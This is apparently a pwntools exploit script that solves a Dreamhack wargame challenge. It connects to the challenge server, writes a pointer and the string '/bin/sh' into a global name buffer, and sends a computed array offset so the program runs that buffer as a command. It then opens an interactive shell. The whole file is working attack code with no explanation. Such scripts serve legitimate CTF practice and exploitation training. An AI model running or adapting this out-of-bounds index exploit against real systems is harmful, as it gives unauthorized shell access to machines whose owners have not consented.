#!/usr/bin/env python2

from pwn import *

context.log_level = "debug"

HOST = "host1.dreamhack.games"
PORT = 18521

conn = remote(HOST, PORT)

addr_command = 0x0804A060
addr_name = 0x0804A0AC
offset = str((addr_name - addr_command) / 4)

conn.sendline(p32(0x0804A0AC+0x4)+"/bin/sh")
conn.sendline(offset)

conn.interactive()
